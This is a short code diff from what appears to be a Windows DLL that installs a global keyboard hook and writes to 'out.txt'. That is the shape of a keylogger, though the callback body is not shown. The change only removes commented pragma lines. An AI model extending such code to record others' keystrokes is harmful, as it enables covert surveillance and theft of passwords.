@@ -4,11 +4,8 @@
 
 #define EXTERN_DLL_EXPORT extern "C" __declspec(dllexport)
 
-//#pragma comment(linker, "/section:.Shared,rws")
-//#pragma data_seg (".Shared")
 HHOOK hKeyboardHook = NULL;
 HINSTANCE hInstance = NULL;
-
 file_handle outputFile(L"out.txt");
 
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam)
